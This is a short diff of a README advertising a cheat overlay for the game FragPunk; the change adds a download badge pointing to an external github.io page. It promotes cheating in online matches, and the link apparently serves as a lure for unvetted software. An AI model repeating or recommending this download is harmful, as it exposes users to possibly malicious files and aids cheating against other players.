@@ -4,7 +4,7 @@ Forget old-school keybinds and blind toggles — if you’re running cheats in F
 
 No need to alt-tab, guess hotkeys, or reload configs. This modded interface lets you **cheat on the fly**, adjust settings mid-match, and keep your game smooth, stable, and fully modded.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Overlay-blueviolet)](https://fragpunk-overlay-ui.github.io/.github/)
 ---
 
 ## 💡 What Is the FragPunk Overlay UI?
